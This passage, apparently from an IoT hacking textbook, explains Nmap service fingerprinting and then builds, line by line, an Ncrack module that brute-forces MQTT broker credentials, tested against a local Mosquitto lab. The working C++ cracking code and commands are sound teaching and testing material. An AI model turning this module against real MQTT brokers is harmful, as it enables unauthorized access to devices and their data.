match networkcaminfo m|&lt;modelDescription&gt;Mega-Pixel| p/Mega-Pixel Network Camera/</code></pre>
<p>Note that we can use special delimiters to set additional information about a service. For instance, <code>p/</code><var>&lt;product name&gt;</var><code>/</code> sets the product name. Nmap can populate other fields, such as <code>i/&lt;extra info&gt;/</code> for additional information or <code>v/&lt;additional version info&gt;/</code> for version numbers. It can use regular expressions to extract data from the response. When we scan the webcam again, Nmap yields the following results against our previously unknown service:</p>
<pre><code># <b>nmap -sV --version-all -p- &lt;target&gt;</b>
Host is up (0.038s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp            OpenBSD ftpd 6.4 (Linux port 0.17)
80/tcp    open  http           Boa HTTPd 0.94.14rc21
554/tcp   open  rtsp           Vivotek FD8134V webcam rtspd
8080/tcp  open  http           Boa HTTPd 0.94.14rc21
42991/tcp open  networkcaminfo Mega-Pixel Network Camera</code></pre>
<p>If we want to include other information in Nmap’s output, such as the model number or the Universally Unique Identifier (UUID), we’d simply need to extract it using regular expressions. Numbered variables ($1, $2, $3, and so on) will be available to populate the information fields. You can see how regular expressions and numbered variables are used in the following <code>match</code> line for ProFTPD, a popular open source file transfer service, where the version information (<code>v/$1/</code>) is extracted from the banner using the regular expression (<code>\d\S+</code>):</p>
<pre><code>match ftp m/^220 ProFTPD (\d\S+) Server/ p/ProFTPD/ v/$1/</code></pre>
<p>You’ll find more information about other available fields in the official Nmap documentation at <a href="https://nmap.org/book/vscan-fileformat.html" class="LinkURL">https://nmap.org/book/vscan-fileformat.html</a><em>.</em></p>
<h2 id="h1-500907c04-0003">Attacking MQTT</h2>
<p class="BodyFirst">MQTT is a machine-to-machine connectivity protocol. It’s used in sensors over satellite links, dial-up connections with health-care providers, home automation, and small devices that require low power usage. It works on top of the TCP/IP stack but is extremely lightweight, because it minimizes messaging using a <em>publish-subscribe architecture</em>. </p>
<p>The publish-subscribe architecture is a messaging pattern in which the senders of messages, called <em>publishers</em>, sort messages into categories, called <em>topics</em>.<em> </em>The<em> subscribers</em>, the recipients of the messages, receive only those messages that belong to the topics to which they’ve subscribed. The architecture then uses intermediary servers, called <em>brokers</em>, to route all messages from publishers to subscribers. <a id="figureanchor4-8" href="#figure4-8">Figure 4-8</a> shows the publish-subscribe model that MQTT uses.</p>
<span epub:type="pagebreak" title="74" id="Page_74"/><figure>
<img src="Images/f04008.png" alt="f04008" width="750" height="225"/>
<figcaption><p><a id="figure4-8">Figure 4-8:</a> MQTT’s publish-subscribe architecture</p></figcaption>
</figure>
<p>One of the main problems with MQTT is that authentication is optional, and even if it’s used, it’s unencrypted by default. When credentials are transmitted in cleartext, attackers with a man-in-the-middle position on the network can steal them. In <a id="figureanchor4-9" href="#figure4-9">Figure 4-9</a>, you can see that the <em>CONNECT</em> packet, sent by an MQTT client to authenticate to a broker, stores the username and password as cleartext.</p>
<figure>
<img src="Images/f04009.png" alt="f04009" width="750" height="394"/>
<figcaption><p><a id="figure4-9">Figure 4-9:</a> The Wireshark traffic dump of an MQTT <em>CONNECT</em> packet contains the username and password transmitted as cleartext.</p></figcaption>
</figure>
<p>Because MQTT has a simple structure and brokers don’t typically limit the number of authentication attempts per client, it’s the ideal IoT network protocol to use to demonstrate authentication cracking. In this section, we’ll create an MQTT module for <em>Ncrack</em>, Nmap’s network authentication cracking tool. </p>
<h3 id="h2-500907c04-0007"><span epub:type="pagebreak" title="75" id="Page_75"/>Setting Up a Test Environment</h3>
<p class="BodyFirst">First, we need to select a representative MQTT broker and set up a test environment. We’ll use the Eclipse Mosquitto software (<a href="https://mosquitto.org/download/" class="LinkURL">https://mosquitto.org/download/</a>), which is open source and cross platform. You can directly install the Mosquitto server and client on Kali Linux by issuing the following command as root:</p>
<pre><code>root@kali:~# <b>apt-get install mosquitto mosquitto-clients</b></code></pre>
<p>Once installed, the broker starts listening on TCP port 1833 on all network interfaces, including the localhost. If needed, you can also start it manually by entering:</p>
<pre><code>root@kali:~# <b>/etc/init.d/mosquitto start</b></code></pre>
<p>To test that it’s working, use <code>mosquito_sub</code> to subscribe to a topic:</p>
<pre><code>root@kali:~# <b>mosquitto_sub -t 'test/topic' -v</b></code></pre>
<p>Then, in another terminal session, publish a test message by entering:</p>
<pre><code>root@kali:~# <b>mosquitto_pub -t 'test/topic' -m 'test message'</b></code></pre>
<p>On the subscriber’s terminal (the one from which you ran <code>mosquitto_sub</code>), you should see <code>test message</code> displayed in the <code>test/topic </code>category. </p>
<p>After verifying that our Mosquitto MQTT environment works and terminating previous terminal sessions, we’ll configure mandatory authentication. We first create a password file for a <code>test</code> user: </p>
<pre><code>root@kali:~# <b>mosquitto_passwd -c /etc/mosquitto/password test</b> 
Password: <b>test123</b>
Reenter password: <b>test123</b></code></pre>
<p>Then we create a configuration file called <em>pass.conf</em> inside the directory <em>/etc/mosquitto/conf.d/</em> with the following contents:</p>
<pre><code>allow_anonymous false
password_file /etc/mosquitto/password</code></pre>
<p>Finally, we restart the Mosquitto broker for the changes to take effect:</p>
<pre><code>root@kali:~# <b>/etc/init.d/mosquitto restart</b></code></pre>
<p>We should now have mandatory authentication configured for our broker. If you try to publish or subscribe without issuing a valid username and password combination, you should get a <code>Connection error:</code><code>Connection Refused: not authorised</code> message. </p>
<p>MQTT brokers send a <em>CONNACK</em> packet in response to a <em>CONNECT</em> packet. You should see the return code 0x00 in the header if the credentials <span epub:type="pagebreak" title="76" id="Page_76"/>are deemed valid and the connection is accepted. If the credentials are incorrect, the return code is 0x05. <a id="figureanchor4-10" href="#figure4-10">Figure 4-10</a> shows what a message with the return code 0x05 looks like, as captured by Wireshark. </p>
<figure>
<img src="Images/f04010.png" alt="f04010" width="750" height="328"/>
<figcaption><a id="figure4-10">Figure 4-10</a>: MQTT <em>CONNACK</em> packet with return code 05, refusing the connection due to invalid credentials </figcaption></figure>
<p>Next, we’ll try to connect to the broker using the correct credentials while still capturing the network traffic. To easily see these packets, we fire up Wireshark and start capturing traffic on TCP port 1833. To test the subscriber, we issue this command: </p>
<pre><code>root@kali:~# <b>mosquitto_sub -t 'test/topic' -v -u test -P test123</b></code></pre>
<p>Similarly, to test the publisher, we issue the following command: </p>
<pre><code>root@kali:~# <b>mosquitto_pub -t 'test/topic' -m 'test’ -u test -P test123</b></code></pre>
<p>You can see in <a id="figureanchor4-11" href="#figure4-11">Figure 4-11</a> that the broker now returns a <em>CONNACK</em> packet with a return code of 0x00. </p>
<figure>
<img src="Images/f04011.png" alt="f04011" width="750" height="315"/>
<figcaption><p><a id="figure4-11">Figure 4-11:</a> MQTT <em>CONNACK</em> packet with return code 0, indicating credentials were correct</p></figcaption>
</figure>
<h3 id="h2-500907c04-0008"><span epub:type="pagebreak" title="77" id="Page_77"/>Writing the MQTT Authentication-Cracking Module in Ncrack</h3>
<p class="BodyFirst">In this section, we’ll expand Ncrack to support MQTT, allowing us to crack its credentials. Ncrack (<a href="https://nmap.org/ncrack/" class="LinkURL">https://nmap.org/ncrack/</a>) is a high-speed network authentication cracking tool with a modular architecture. It supports a variety of network protocols (as of version 0.7, this includes SSH, RDP, FTP, Telnet, HTTP and HTTPS, WordPress, POP3 and POP3S, IMAP, CVS, SMB, VNC, SIP, Redis, PostgreSQL, MQTT, MySQL, MSSQL, MongoDB, Cassandra, WinRM, OWA, and DICOM). It belongs to the Nmap suite of security tools. Its modules perform dictionary attacks against protocol authentications, and it ships with a variety of username and password lists.</p>
<p>The latest recommended version of Ncrack is on GitHub at <a href="https://github.com/nmap/ncrack/" class="LinkURL">https://github.com/nmap/ncrack/</a>, although precompiled packages exist for distributions such as Kali Linux. The latest version already includes the MQTT module, so if you want to reproduce the next steps on your own, find the <code>git </code>commit from right before the module was added. To do that, use the following commands: </p>
<pre><code>root@kali:~# <b>git clone https://github.com/nmap/ncrack.git</b>
root@kali:~# <b>cd ncrack</b>
root@kali:~/ncrack# <b>git checkout 73c2a165394ca8a0d0d6eb7d30aaa862f22faf63</b></code></pre>
<h4 id="h3-500907c04-0001">A Quick Intro to Ncrack’s Architecture </h4>
<p class="BodyFirst">Like Nmap, Ncrack is written in C/C++, and it uses Nmap’s <em>Nsock</em> library to handle sockets in an asynchronous, event-driven manner. This means that instead of using multiple threads or processes to achieve parallelism, Ncrack continuously polls socket descriptors registered by each invoked module. Whenever a new network event occurs, such as a read, write, or timeout, it jumps to a preregistered callback handler that does something about the particular event. The internals of this mechanism are beyond the scope of this chapter. If you want a deeper understanding of Ncrack’s architecture, you can read the official developer’s guide at <a href="https://nmap.org/ncrack/devguide.html" class="LinkURL">https://nmap.org/ncrack/devguide.html</a>. We’ll explain how the event-driven socket paradigm comes into the picture while developing the MQTT module. </p>
<h4 id="h3-500907c04-0002">Compiling Ncrack </h4>
<p class="BodyFirst">To begin, make sure you have a working, compilable version of Ncrack in your test environment. If you’re using Kali Linux, make sure you have all the build tools and dependencies available by issuing this command:</p>
<pre><code>root@kali:~# <b>sudo apt install build-essential autoconf g++ git libssl-dev</b></code></pre>
<p><span epub:type="pagebreak" title="78" id="Page_78"/>Then clone the latest version of Ncrack from GitHub by entering: </p>
<pre><code>root@kali:~# <b>git clone https://github.com/nmap/ncrack.git</b></code></pre>
<p>Compiling should then be a simple matter of entering the following line inside the newly created <em>ncrack</em> directory:</p>
<pre><code>root@kali:~/ncrack#<b> </b><b>./configure &amp;&amp; make</b></code></pre>
<p>You should now have a working Ncrack binary inside the local directory. To test this, try running Ncrack without any arguments:</p>
<pre><code>root@kali:~/ncrack# <b>./ncrack</b></code></pre>
<p>This should display the help menu.</p>
<h4 id="h3-500907c04-0003">Initializing the Module</h4>
<p class="BodyFirst">You need to follow some standard steps every time you create a new module in Ncrack. First, edit the <em>ncrack-services</em> file to include the new protocol and its default port. Because MQTT uses TCP port 1833, we add the following line (anywhere in the file is fine): </p>
<pre><code>mqtt 1883/tcp</code></pre>
<p>Second, include a reference to your module’s main function (for example, <code>ncrack_mqtt</code> in our case) in the <code>call_module</code> function inside the <em>ncrack.cc</em> file. All module main functions have the naming convention <code>ncrack_</code><var>protocol</var>,<code/>substituting <var>protocol</var> for the actual protocol name. Add the following two lines inside the main <code>else-if</code> case:</p>
<pre><code>  else if (!strcmp(name, "mqtt"))
    ncrack_mqtt(nsp, con);</code></pre>
<p>Third, we create the main file for our new module under the <em>modules</em> directory and name it <em>ncrack_mqtt.cc</em>. The <em>modules.h</em> file needs to have the definition of the main module function, so we add it. All main module functions have the same arguments (<code>nsock_pool, Connection *)</code>:</p>
<pre><code>void ncrack_mqtt(nsock_pool nsp, Connection *con);</code></pre>
<p>Fourth, we edit <em>configure.ac</em> in the main <em>Ncrack</em> directory to include the new module files <em>ncrack_mqtt.cc</em> and <em>ncrack_mqtt.o</em> in the <code>MODULES_SRCS</code> and <code>MODULES_OBJS</code> variables, respectively: </p>
<pre><code>MODULES_SRCS="$MODULES_SRCS ncrack_ftp.cc ncrack_telnet.cc ncrack_http.cc \
ncrack_pop3.cc ncrack_vnc.cc ncrack_redis.cc ncrack_owa.cc \
ncrack_imap.cc ncrack_cassandra.cc ncrack_mssql.cc ncrack_cvs.cc \
ncrack_wordpress.cc ncrack_joomla.cc ncrack_dicom.cc ncrack_mqtt.cc"
<span epub:type="pagebreak" title="79" id="Page_79"/>MODULES_OBJS="$MODULES_OBJS ncrack_ftp.o ncrack_telnet.o ncrack_http.o \
ncrack_pop3.o ncrack_vnc.o ncrack_redis.o ncrack_owa.o \
ncrack_imap.o ncrack_cassandra.o ncrack_mssql.o ncrack_cvs.o \
ncrack_wordpress.o ncrack_joomla.o ncrack_dicom.o ncrack_mqtt.o"</code></pre>
<p>Note that after making any change to <em>configure.ac</em>, we need to run the <code>autoconf</code> tool inside the main directory to create the new <em>configure</em> script to be used in the compilation: </p>
<pre><code>root@kali:~/ncrack#<b> </b><b>autoconf </b></code></pre>
<h4 id="h3-500907c04-0004">The Main Code</h4>
<p class="BodyFirst">Now let’s write the MQTT module code in the <em>ncrack_mqtt.cc </em>file. This module will conduct a dictionary attack against MQTT server authentication. <a id="listinganchor4-1" href="#listing4-1">Listing 4-1</a> shows the first part of our code, which has the header inclusions and function declarations.</p>
<pre><code>#include "ncrack.h"
#include "nsock.h"
#include "Service.h"
#include "modules.h"

#define MQTT_TIMEOUT 20000 <span class="CodeAnnotation">1</span>
extern void ncrack_read_handler(nsock_pool nsp, nsock_event nse, void *mydata); <span class="CodeAnnotation">2</span>
extern void ncrack_write_handler(nsock_pool nsp, nsock_event nse, void *mydata);
extern void ncrack_module_end(nsock_pool nsp, void *mydata);

static int mqtt_loop_read(nsock_pool nsp, Connection *con); <span class="CodeAnnotation">3</span>
enum states { MQTT_INIT, MQTT_FINI }; <span class="CodeAnnotation">4</span></code></pre>
<p class="CodeListingCaption"><a id="listing4-1">Listing 4-1:</a> Header inclusions and function declarations</p>
<p>The file begins with local header inclusions that are standard for every module. In <code>MQTT_TIMEOUT</code>, we then define <span class="CodeAnnotation">1</span> how long we’ll wait until we receive an answer from the broker. We’ll use this value later in the code. Next, we declare three important callback handlers: <code>ncrack_read_handler</code> and <code>ncrack_write_handler</code> for reading and writing data to the network, and <code>ncrack_module_end</code>, which must be called each time we finish a whole authentication round <span class="CodeAnnotation">2</span>. These three functions are defined in <em>ncrack.cc</em> and their semantics aren’t important here. </p>
<p>The function <code>mqtt_loop_read</code><span class="CodeAnnotation">3</span> is a <em>local-scope</em> helper function (meaning it’s visible only within the module file, due to the <code>static</code> modifier) that will parse the incoming MQTT data. Finally, we’ll have two states in our module <span class="CodeAnnotation">4</span>. States, in Ncrack lingo, refer to specific steps in the authentication process for the particular protocol we’re cracking. Each state performs a micro-action, which almost always involves registering a certain network-related Nsock event. For example, in the <code>MQTT_INIT</code> state, we send our first <span epub:type="pagebreak" title="80" id="Page_80"/>MQTT <em>CONNECT</em> packet to the broker. Then, in the <code>MQTT_FINI</code> state, we receive the <em>CONNACK</em> packet from it. Both states involve either writing or reading data to the network. </p>
<p>The second part of the file defines two structures that will help us manipulate the <em>CONNECT</em> and <em>CONNACK</em> packets. <a id="listinganchor4-2" href="#listing4-2">Listing 4-2</a> shows the code for the former.</p>
<pre><code>struct connect_cmd {
  uint8_t message_type; /* 1 for CONNECT packet */
  uint8_t msg_len;      /* length of remaining packet */
  uint16_t prot_name_len; /* should be 4 for "MQTT" */
  u_char protocol[4];   /* it's always "MQTT" */
  uint8_t version;      /* 4 for version MQTT version 3.1.1 */
  uint8_t flags;        /* 0xc2 for flags: username, password, clean session */
  uint16_t keep_alive;  /* 60 seconds */
  uint16_t client_id_len; /* should be 6 with "Ncrack" as id */
  u_char client_id[6];  /* let's keep it short - Ncrack */ 
  uint16_t username_len; /* length of username string */
    /* the rest of the packet, we'll add dynamically in our buffer:
     * username (dynamic length), 
     * password_length (uint16_t)
     * password (dynamic length)
     */
  connect_cmd() {  /* constructor - initialize with these values */ <span class="CodeAnnotation">1</span>
    message_type = 0x10; 
    prot_name_len = htons(4);    
    memcpy(protocol, "MQTT", 4);
    version = 0x04; 
    flags = 0xc2;
    keep_alive = htons(60);
    client_id_len = htons(6);
    memcpy(client_id, "Ncrack", 6);
  }
} __attribute__((__packed__)) connect_cmd;</code></pre>
<p class="CodeListingCaption"><a id="listing4-2">Listing 4-2:</a> Structure for manipulating the <em>CONNECT</em> packet</p>
<p>We define the C struct <code>connect_cmd</code> to contain the expected fields of an MQTT <em>CONNECT</em> packet as its members. Because the initial part of this type of packet is composed of a fixed header, it’s easy to statically define the values of these fields. The <em>CONNECT </em>packet is an MQTT control packet that has:</p>
<ul>
<li>A <em>fixed header</em> made of the Packet Type and Length fields.</li>
<li>A <em>variable header</em> made of the Protocol Name (prefixed by the Protocol Name Length), Protocol Level, Connect Flags, and Keep Alive.</li>
<li><span epub:type="pagebreak" title="81" id="Page_81"/>A <em>payload</em> with one or more length-prefixed fields; the presence of these fields is determined by the <em>Connect flags</em>—in our case, the Client Identifier, Username, and Password.</li>
</ul>
<p>To determine exactly how the MQTT <em>CONNECT </em>packet is structured, consult the official protocol specification at <a href="https://docs.oasis-open.org/mqtt/mqtt/v5.0/os/mqtt-v5.0-os.html#_Toc3901033/" class="LinkURL">https://docs.oasis-open.org/mqtt/mqtt/v5.0/os/mqtt-v5.0-os.html#_Toc3901033/</a>. For convenience, you can use <a id="tableanchor4-2" href="#table4-2">Table 4-2</a>, which we created. We also recommend looking up the same packet structure in the Wireshark traffic dump (for example, <a href="#figure4-9">Figure 4-9</a>). You’ll generally have some flexibility regarding how to map the packet fields in the C struct fields; our way of doing it is one among many.</p>
<p>The <code>message_type</code> is a four-bit field that determines the packet type. The value <code>1</code> specifies the <em>CONNECT</em> packet. Note that we allocate eight bits (<code>uint8_t</code>) for this field to cover the four least significant bits reserved for this packet type (all <code>0</code>). The <code>msg_len</code> is the number of bytes remaining in the current packet, not including the bytes of the length field. It corresponds to the packet’s <em>Length</em> field.</p>
<p>Next on the variable header,<code> prot_name_len </code>and <code>protocol</code> correspond to the fields <em>Protocol Name Length</em> and <em>Protocol Name</em>. This length should always be <code>4</code>, because the protocol name is always represented by the capitalized UTF-8 encoded string <code>“MQTT”</code>. The <code>version</code>, representing the <em>Protocol Level</em> field, has the value <code>0x04</code> for MQTT version 3.1.1, but later standards might use different values. The <code>flags</code>, representing the <em>Connect Flags</em> field, determine the behavior of the MQTT connection and the presence or absence of fields in the payload. We’ll initialize it with the value <code>0xC2</code> to set the three flags: <code>username</code>, <code>password</code>, and <code>clean session</code>. The <code>keep_alive</code>, representing the <em>Keep Alive</em> field, is a time interval in seconds that determines the maximum amount of time that can lapse between sending consecutive control packets. It’s not important in our case, but we’ll use the same value as the Mosquitto application does.</p>
<p>Finally, the packet payload begins with the <code>client_id_length</code> and <code>client_id</code>. The <em>Client Identifier</em> must always be the first field in the <em>CONNECT</em> packet payload. It’s supposed to be unique for each client, so we’ll use <code>“Ncrack”</code> for our module. The remaining fields are the 
<em>Username Length</em> (<code>username_len</code>), <em>Username</em>, <em>Password Length</em>, and <em>Password</em>. Because we expect to be using different usernames and passwords for each connection (because we’re performing a dictionary attack), we’ll dynamically allocate the last three later in the code. </p>
<p>We then use the struct constructor <span class="CodeAnnotation">1</span> to initialize these fields with values that we know will stay the same.</p>
<figure>
<figcaption class="TableTitle"><p><a id="table4-2">Table 4-2</a>: The MQTT <em>CONNECT</em> Packet Structure: Fixed Header, Variable Header, and Payload Separated by Bold Border<span epub:type="pagebreak" title="82" id="Page_82"/></p></figcaption>
<img src="Images/t04002.png" alt="t04002" width="750" height="677"/>
</figure>
<p>Our server will send the <em>CONNACK</em> packet in response to a <em>CONNECT</em> packet from a client. <a id="listinganchor4-3" href="#listing4-3">Listing 4-3</a> shows the structure of the <em>CONNACK </em>packet.</p>
<pre><code>struct ack {
  uint8_t message_type;
  uint8_t msg_len;
  uint8_t flags;
  uint8_t ret_code;
} __attribute__((__packed__)) ack;</code></pre>
<p class="CodeListingCaption"><a id="listing4-3">Listing 4-3:</a> Structure for manipulating the <em>CONNACK</em> packet</p>
<p>The <code>message_type</code> and <code>msg_len</code> comprise the standard fixed header of an MQTT control packet, similar to the <em>CONNECT</em> packet’s header. MQTT sets the <code>message_type</code> value for the <em>CONNACK</em> packet to <code>2</code>. The <code>flags</code> are normally all <code>0</code> for this type of packet. You can see this in <a href="#figure4-10">Figure 4-10</a> and <span epub:type="pagebreak" title="83" id="Page_83"/><a href="#figure4-11">Figure 4-11</a>, also. The <code>ret_code</code> is the most important field because, depending on its value, we can determine whether or not our credentials were accepted. A return code of 0x00 signifies an accepted connection, while a return code of 0x05 indicates that the connection isn’t authorized (as we saw in <a href="#figure4-10">Figure 4-10</a>) because either no credentials were provided or they were incorrect. Although there are other return values, to keep our module simple, we’ll assume that any value other than 0x00 means we must try different credentials.</p>
<p>The struct’s <code>packed</code> attribute is a directive to the C compiler to not add any padding in between the fields (which it usually does automatically to optimize memory access), so everything is kept intact. We did the same for the <code>connect_cmd</code> struct. This is good practice for structs used in networking. </p>
<p>Next, we define a function called <code>mqtt_loop_read</code> to parse the <em>CONNACK </em>packet, as <a id="listinganchor4-4" href="#listing4-4">Listing 4-4</a> shows.</p>
<pre><code>static int
mqtt_loop_read(nsock_pool nsp, Connection *con)
{
  struct ack *p; <span class="CodeAnnotation">1</span>
  if (con-&gt;inbuf == NULL || con-&gt;inbuf-&gt;get_len() &lt; 4) {
    nsock_read(nsp, con-&gt;niod, ncrack_read_handler, MQTT_TIMEOUT, con);
    return -1;
  }

  p = (struct ack *)((char *)con-&gt;inbuf-&gt;get_dataptr()); <span class="CodeAnnotation">2</span>
  if (p-&gt;message_type != 0x20) /* reject if not an MQTT ACK message */
    return -2;

  if (p-&gt;ret_code == 0) /* return 0 only if return code is 0 */ <span class="CodeAnnotation">3</span>
    return 0;

  return -2;
}</code></pre>
<p class="CodeListingCaption"><a id="listing4-4">Listing 4-4:</a> Definition of the <code>mqtt_loop_read</code> function, which is responsible for parsing <em>CONNACK</em> packets and checking the return code</p>
<p>We first declare a local pointer <code>p </code><span class="CodeAnnotation">1</span> to a struct of type <code>ack</code>. We then check whether we’ve received any data in our incoming buffer (is the <code>con-&gt;inbuf</code> pointer <code>NULL</code>?) or whether the received data’s length is less than 4, which is the minimum size for the expected server’s reply. If either of these conditions is true, we need to keep waiting for incoming data, so we schedule an <code>nsock_read</code> event that will be handled by our standard <code>ncrack_read_handler</code>. </p>
<p>How these functions work internally is beyond the scope of this book, but it’s important to understand the asynchronous nature of this method. The point is that these functions will do their jobs after the module returns control to the main Ncrack engine, which will happen after the function <code>ncrack_mqtt</code> ends execution. To know where the module left off for each TCP connection when it’s next called, Ncrack keeps the current state in the <code>con-&gt;state </code>variable. Additional information is also kept in other members of the <code>Connection</code> class, such as the buffers for incoming (<code>inbuf</code>) and outgoing (<code>outbuf</code>) data. </p>
<p><span epub:type="pagebreak" title="84" id="Page_84"/>Once we know we’ve received a complete <em>CONNACK</em> reply, we can point our local <code>p</code> pointer to the buffer <span class="CodeAnnotation">2</span> meant for incoming network data. We cast that buffer to the <code>struct ack</code> pointer. In simple terms, this means that we can now use the <code>p</code> pointer to easily browse through the members of the struct. Then the first thing we check in the received packet is whether or not it’s a <em>CONNACK</em> packet; if it’s not, we shouldn’t bother parsing it any further. If it is, we check whether the return code is 0 <span class="CodeAnnotation">3</span>, in which case we return a 0 to notify the caller that the credentials were correct. Otherwise, an error occurred or the credentials were incorrect, and we return a -2. </p>
<p>The final part of our code is the main <code>ncrack_mqtt </code>function that handles all the logic for authenticating against an MQTT server. It’s divided into two listings: <a id="listinganchor4-5" href="#listing4-5">Listing 4-5</a> contains the logic for the <code>MQTT_INIT</code> state, and <a href="#listing4-6" id="listinganchor4-6">Listing 4-6</a> contains the logic for the <code>MQTT_FINI</code> state.  </p>
<pre><code>void
ncrack_mqtt(nsock_pool nsp, Connection *con)
{
nsock_iod nsi = con-&gt;niod; <span class="CodeAnnotation">1</span>
  struct connect_cmd cmd;
  uint16_t pass_len;

switch (con-&gt;state) <span class="CodeAnnotation">2</span>
{
  case MQTT_INIT:
    con-&gt;state = MQTT_FINI;

    delete con-&gt;inbuf; <span class="CodeAnnotation">3</span>
    con-&gt;inbuf = NULL;
    if (con-&gt;outbuf)
      delete con-&gt;outbuf;
    con-&gt;outbuf = new Buf();

    /* the message len is the size of the struct plus the length of the usernames
     * and password minus 2 for the first 2 bytes (message type and message length) that 
     * are not counted in
     */
    cmd.msg_len = sizeof(connect_cmd) + strlen(con-&gt;user) + strlen(con-&gt;pass) + 
                    sizeof(pass_len) - 2; <span class="CodeAnnotation">4</span>
    cmd.username_len = htons(strlen(con-&gt;user));
    pass_len = htons(strlen(con-&gt;pass));

    con-&gt;outbuf-&gt;append(&amp;cmd, sizeof(cmd)); <span class="CodeAnnotation">5</span>
    con-&gt;outbuf-&gt;snprintf(strlen(con-&gt;user), "%s", con-&gt;user);
    con-&gt;outbuf-&gt;append(&amp;pass_len, sizeof(pass_len));
    con-&gt;outbuf-&gt;snprintf(strlen(con-&gt;pass), "%s", con-&gt;pass);

    nsock_write(nsp, nsi, ncrack_write_handler, MQTT_TIMEOUT, con, <span class="CodeAnnotation">6</span>
          (const char *)con-&gt;outbuf-&gt;get_dataptr(), con-&gt;outbuf-&gt;get_len());
    break;</code></pre>
<p class="CodeListingCaption"><a id="listing4-5">Listing 4-5:</a> The <code>MQTT_INIT</code> state that sends the <em>CONNECT</em> packet</p>
<p><span epub:type="pagebreak" title="85" id="Page_85"/>The first block of code in our main function declares three local variables <span class="CodeAnnotation">1</span>. Nsock uses the <code>nsock_iod</code> variable whenever we register network read and write events through <code>nsock_read</code> and <code>nsock_write</code> correspondingly. The struct <code>cmd</code>, which we defined in <a href="#listing4-2">Listing 4-2</a>, handles the incoming <em>CONNECT</em> packet. Note that its constructor is automatically called when we declare it, so it’s initialized with the default values we gave each field. We’ll use <code>pass_len</code> to temporarily store the password length’s two-byte value. </p>
<p>Every Ncrack module has a <code>switch</code> statement <span class="CodeAnnotation">2</span> in which each case represents a specific step of the authentication phase for the particular protocol we’re cracking. MQTT authentication only has two states: we start with <code>MQTT_INIT</code>, and then set the next state to be <code>MQTT_FINI</code>. This means that when we end the execution of this phase and return control to the main Ncrack engine, the switch statement will continue from the next state, <code>MQTT_FINI</code> (shown in <a href="#listing4-6">4-6</a>), when the module gets executed again for this particular TCP connection.</p>
<p>We then make sure our buffers for receiving (<code>con-&gt;inbuf</code>) and sending (<code>con-&gt;outbuf</code>) network data are clear and empty <span class="CodeAnnotation">3</span>. Next, we update the remaining length field in our <code>cmd</code> struct <span class="CodeAnnotation">4</span>. Remember that this is calculated as the remaining length of the <em>CONNECT</em> packet, not including the length field. We must take into account the size of the extra three fields (username, password length, and password) that we’re adding at the end of our packet, because we didn’t include those in our <code>cmd</code> struct. We also update the username length field with the actual size of the current username. Ncrack automatically iterates through the dictionary and updates the username and password in the <code>user</code> and <code>pass</code> variables of the <code>Connection</code> class accordingly. We also calculate the password length and store it in <code>pass_len</code>. Next, we start crafting our outgoing CONNECT packet by first adding our updated <code>cmd</code> struct to the <code>outbuf </code><span class="CodeAnnotation">5</span> and then dynamically adding the extra three fields. The <code>Buffer </code>class (<code>inbuf</code>, <code>outbuf</code>) has its own convenient functions, such as <code>append</code> and <code>snprintf</code>, with which you can easily and gradually add formatted data to craft your own TCP payloads. </p>
<p>Additionally, we schedule our packet in <code>outbuf</code> to be sent to the network by registering a network write event through <code>nsock_write</code>, handled by <code>ncrack_write_handler</code><span class="CodeAnnotation">6</span>. Then we end the switch statement and the <code>ncrack_mqtt</code> function (for now) and return execution control to the main engine, which among other tasks will loop through any registered network events (like the one we just scheduled above with the use of the <code>ncrack_mqtt</code> function) and handle them. </p>
<p>The next state, <code>MQTT_FINI</code>, receives and parses the incoming CONNACK packet from the broker and checks whether our provided credentials were correct. <a href="#listing4-6">Listing 4-6</a> shows the code, which goes in the same function definition as <a href="#listing4-5">Listing 4-5</a>.</p>
<pre><code>    case MQTT_FINI:
      if (mqtt_loop_read(nsp, con) == -1) <span class="CodeAnnotation">1</span>
        break;
      else if (mqtt_loop_read(nsp, con) == 0) <span class="CodeAnnotation">2</span>
        con-&gt;auth_success = true;

<span epub:type="pagebreak" title="86" id="Page_86"/>      con-&gt;state = MQTT_INIT; <span class="CodeAnnotation">3</span>
      delete con-&gt;inbuf;
      con-&gt;inbuf = NULL;
      return ncrack_module_end(nsp, con); <span class="CodeAnnotation">4</span>
  }
}</code></pre>
<p class="CodeListingCaption"><a id="listing4-6">Listing 4-6:</a> The <code>MQTT_FINI </code>state that receives the incoming <em>CONNACK</em> packet and evaluates if the username and password combination we sent were correct or not</p>
<p>We start by asking <code>mqtt_loop_read</code> whether we’ve received the server’s reply yet <span class="CodeAnnotation">1</span>. Recall from <a href="#listing4-4">Listing 4-4</a> that it will return -1 if we haven’t yet gotten all four bytes of the incoming packet. If we haven’t yet received the complete reply of the server, <code>mqtt_loop_read</code> will register a read event, and we’ll return control to the main engine to wait for those data or handle other events registered from other connections (of the same or other modules that might be running). If <code>mqtt_loop_read</code> returns 0 <span class="CodeAnnotation">2</span>, it means that the current username and password successfully authenticated against our target and we should update the Connection variable <code>auth_success</code>  so Ncrack marks the current credential pair as valid. </p>
<p>We then update the internal state to go back to <code>MQTT_INIT</code><span class="CodeAnnotation">3</span>, because we have to loop through the rest of the credentials in the current dictionary. At this point, because we’ve completed a full authentication attempt, we call <code>ncrack_module_end</code><span class="CodeAnnotation">4</span>, which will update some statistical variables (such as the number of times we’ve attempted to authenticate so far) for the service. </p>
<p>The concatenation of all six listings makes up the whole MQTT module file <em>ncrack_mqtt.cc</em>. The GitHub commit at <a href="https://github.com/nmap/ncrack/blob/accdba084e757aef51dbb11753e9c36ffae122f3/modules/ncrack_mqtt.cc/" class="LinkURL">https://github.com/nmap/ncrack/blob/accdba084e757aef51dbb11753e9c36ffae122f3/modules/ncrack_mqtt.cc/</a> provides the file we coded in its entirety. After finishing with the code, we enter <code>make</code> in the main <em>Ncrack</em> directory to compile our new module.</p>
<h3 id="h2-500907c04-0009">Testing the Ncrack Module Against MQTT</h3>
<p class="BodyFirst">Let’s test our new module against the Mosquitto broker to see how fast we can find a correct username and password pair. We can do that by running the module against our local Mosquitto instance:</p>
<pre><code>root@kali:~/ncrack#<b>./ncrack mqtt://127.0.0.1 --user test -v</b>
Starting Ncrack 0.7 ( http://ncrack.org ) at 2019-10-31 01:15 CDT

Discovered credentials on mqtt://127.0.0.1:1883 'test' 'test123'
mqtt://127.0.0.1:1883 finished.

Discovered credentials for mqtt on 127.0.0.1 1883/tcp:
127.0.0.1 1883/tcp mqtt: 'test' 'test123'

Ncrack done: 1 service scanned in 3.00 seconds.
